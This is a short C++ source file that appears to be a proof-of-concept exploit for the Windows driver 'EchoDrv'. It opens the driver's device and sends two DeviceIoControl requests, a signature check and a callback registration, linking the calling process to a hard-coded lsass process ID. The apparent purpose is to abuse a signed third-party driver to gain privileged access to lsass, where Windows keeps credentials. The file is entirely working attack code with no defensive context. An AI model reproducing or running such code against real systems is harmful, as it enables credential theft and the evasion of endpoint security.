#include <iostream>

#include <windows.h>
#include <winternl.h>

// DeviceIoControl codes

#define ECHODRV_VERIFY_SIGNATURE  CTL_CODE(0x9E6A, 0x165, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ECHODRV_REGISTER_CALLBACK CTL_CODE(0x252E, 0x782, METHOD_BUFFERED, FILE_READ_ACCESS)

// CreateFileA flags

#define ECHODRV_DESIRED_ACCESS 0xC0000000
#define ECHODRV_SHARE_MODE     0x3
#define ECHODRV_CREATION_DISP  0x3

using ulong = DWORD;

namespace echo::structs
{
  struct VerifySignature
  {
	PUCHAR pb_sig;
	ulong cb_sig;

	char pad[4];

	bool success; ulong unk;
  };

  struct RegisterCallback
  {
	ulong proc_id;
	ulong proc_id2;

	int64_t unk_1;

	bool success;
	ulong self_proc_id;
  };
}

namespace echo::driver
{
  void* attached_handle = { };
  void* handle          = { };
  
  bool initialize() noexcept
  {
	handle = CreateFileA("\\\\.\\EchoDrv", ECHODRV_DESIRED_ACCESS,
	  ECHODRV_SHARE_MODE, 0ul, ECHODRV_CREATION_DISP, 0ul, nullptr);

	return handle != nullptr;
  }

  #pragma warning (disable:6273)

  template <typename Type>
  bool call_driver(const ulong& dispatch_id, Type& packet) noexcept
  {
	printf("Calling DeviceIoControl [%x] [%p, %zd]\n", dispatch_id, &packet, sizeof(packet));

	return DeviceIoControl
	(
	  handle, dispatch_id, &packet, sizeof(packet), &packet, sizeof(packet), nullptr, nullptr
	);
  }

  #pragma warning (default:6273)

  /*
	After I hooked DeviceIoControl on the main Echocm
	executable, I saw that 'verify_signature' is being called first.

	NOTE: VerifySignature status seems to be 0.
  */

  bool verify_signature() noexcept
  {
	structs::VerifySignature packet = { };

	 return call_driver<structs::VerifySignature>
	  (ECHODRV_VERIFY_SIGNATURE, packet);
  }

  bool register_callback(const ulong& proc_id, const ulong& proc_id2) noexcept
  {
	structs::RegisterCallback packet = { };

	{
	  packet.proc_id  = proc_id;
	  packet.proc_id2 = proc_id2;
	}

	return call_driver<structs::RegisterCallback>
	  (ECHODRV_REGISTER_CALLBACK, packet);
  }
}

constexpr ulong lsass = 852ul;

int main(int argc, char** argv)
{
  using namespace echo;
  
  if constexpr (lsass > 0)
  {
	if (!driver::initialize())
	  printf("Failed to initialize driver [%d]\n", GetLastError());
	
	if (!driver::verify_signature())
	  printf("Failed to verify signature [%d]\n", GetLastError());

	if (!driver::register_callback(GetCurrentProcessId(), lsass))
	  printf("Failed to register callback [%d]\n", GetLastError());
  }
  else
  {
	printf("Please enter valid lsass process ID\n");
  }

  return getchar();
}